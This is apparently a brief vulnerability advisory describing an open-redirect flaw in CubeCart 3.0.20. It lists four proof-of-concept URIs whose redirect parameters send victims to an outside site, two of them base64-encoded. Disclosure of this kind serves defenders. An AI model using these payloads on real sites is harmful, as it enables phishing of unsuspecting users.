An attacker can exploit this issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/cube3.0.20/switch.php?r=//yehg.net/&amp;lang=es
http://www.example.com/cube3.0.20/admin/login.php?goto=//yehg.net
http://www.example.com/cube/index.php?act=login&amp;redir=Ly95ZWhnLm5ldC8%3D
http://www.example.com/cube/cart.php?act=reg&amp;redir=L2N1YmUvaW5kZXgucGhwP2FjdD1sb2dpbg%3D%3D
